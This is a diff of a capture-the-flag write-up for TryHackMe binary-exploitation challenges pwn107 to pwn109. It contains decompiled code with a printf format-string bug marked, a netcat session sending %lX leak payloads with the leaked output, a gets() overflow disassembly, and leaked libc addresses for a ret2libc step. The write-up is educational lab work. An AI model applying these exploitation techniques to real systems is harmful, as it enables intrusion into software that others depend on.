@@ -282,7 +282,7 @@ db  0x00000a36 # break
  $
 ```
 So input address is in `%6$p` so that we now address of canary and static_libc is `%13$p` and `%10$p`(this could change to or 10 in remote server)
-Using exploit [exploit](CTF_exploit/THM_pwn101/pwn107.py)
+Using exploit: [exploit](CTF_exploit/THM_pwn101/pwn107.py)
 
 ```bash
 python pwn107.py REMOTE 10.10.123.26 9007
@@ -311,9 +311,132 @@ $
 ```
 
 
-
-
-
 ## Flag8
+reverse engineer main we have
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+int setup(void);
+int banner(void);
+
+int main(void) {
+    /* stack protector (canary) loaded from fs:0x28 and stored at [rbp-0x8] */
+    uint64_t saved_canary = *(uint64_t *)(/* fs:0x28 */ 0); /* conceptual */
+
+    setup();
+    banner();
+
+    puts("...");   /* string at 0x402177 */
+    puts("...");   /* string at 0x402198 */
+    printf("..."); /* string at 0x4021c5 */
+
+    /* Stack frame reserve: sub rsp, 0x90
+       There are two buffers laid out like this:
+         rbp-0x90  ..  rbp-0x70   == 0x20 bytes (32)   -> buffer1
+         rbp-0x70  ..  rbp-0x08   == 0x68 bytes (104)  -> buffer2
+       (rbp-0x8 holds the saved canary) */
+    char buf1[0x20];     /* 32 bytes */
+    /* read from stdin (fd=0), length = 0x12 (18 bytes) */
+    read(0, buf1, 0x12);
+
+    printf("..."); /* string at 0x4021d5 */
+
+    char buf2[0x68];     /* 104 bytes */
+    /* read from stdin (fd=0), length = 0x64 (100 bytes) */
+    read(0, buf2, 0x64);
+
+    puts("...");     /* string at 0x4021e6 */
+
+    /* Several prints follow. Pay attention to the argument registers used in asm:
+       - At one point the code does: mov rsi, buf1; mov rdi, <static fmt>; call printf
+         -> safe: printf(static_fmt, buf1)
+       - Later the code does: mov rdi, buf2; call printf
+         -> DANGEROUS: printf(buf2) — the user input is used as the format string. */
+    printf("<static format>", buf1);  /* prints something using buf1 as an argument */
+    printf("<static format2>");       /* prints fixed message */
+    printf(buf2);                    /* <-- format-string vulnerability if buf2 contains % specifiers */
+
+    puts("..."); /* 0x40221f */
+    puts("..."); /* 0x402268 */
+
+    /* stack protector check */
+    if (saved_canary != *(uint64_t *)(/* fs:0x28 */ 0))
+        __stack_chk_fail();
+
+    return 0;
+}
+
+```
+
+
+```bash
+nc 10.10.17.26 9008
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 108
+
+      THM University 📚
+👨🎓 Student login portal 👩🎓
+
+=[Your name]: aaa
+=[Your Reg No]: AAAA.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX
+
+=[ STUDENT PROFILE ]=
+Name         : aaa
+Register no  : AAAA.7FFCDDECBD30.0.0.F.F.A616161.0.0.0.586C252E41414141.586C252E586C252E.586C252E586C252E.586C252E586C252E.586C252E586C252E.586C252E586C252E.586C252E586C252E.586C252E586C252E
+@Institue     : THM
+Branch       : B.E (Binary Exploitation)
+```
+
+
+We see input is at %10$p . Control prinf(buf) to  overwrite address puts() to the holiday() in got . How to write it is in  [exploit](CTF_exploit/THM_pwn101/pwn108.py)
+
 ## Flag9
+
+```asm
+int main(int argc, char **argv, char **envp);
+; var char *s @ stack - 0x28
+0x004011f2      endbr64
+0x004011f6      push    rbp
+0x004011f7      mov     rbp, rsp
+0x004011fa      sub     rsp, 0x20
+0x004011fe      mov     eax, 0
+0x00401203      call    setup      ; sym.setup
+0x00401208      mov     eax, 0
+0x0040120d      call    banner     ; sym.banner
+0x00401212      lea     rdi, [str.This_time_no] ; 0x402120 ; const char *s
+0x00401219      call    section..plt.sec ; sym.imp.puts ; int puts(const char *s)
+0x0040121e      lea     rax, [s]
+0x00401222      mov     rdi, rax   ; char *s
+0x00401225      mov     eax, 0
+0x0040122a      call    gets       ; sym.imp.gets ; char *gets(char *s)
+0x0040122f      nop
+0x00401230      leave
+0x00401231      ret
+0x00401232      nop     word cs:[rax + rax]
+0x0040123c      nop     dword [rax]
+```
+
+We see offset to stack is 0x28 and gets()  read all input is place to exploit
+
+### Ret2libc
+
+#### Step 1: Leak version of libc version. Get address GOT of libc using PLT using buffer overflow.
+```bash
+leaked puts  address: 0x7f7e3c494420
+leaked gets  address: 0x7f7e3c493970
+leaked setvbuf  address: 0x7f7e3c494ce0
+
+```
+
+Usig it to find libc version on [libc_check_link](https://libc.blukat.me/)
+![img](CTF_img/THM_pwn101/1.png)
+
+ #### Step 2: Using ROP to ret2libc
+ Using [exploit](CTF_exploit/THM_pwn101/pwn109.py) and read it to know how to controll the address
+
 ## Flag10
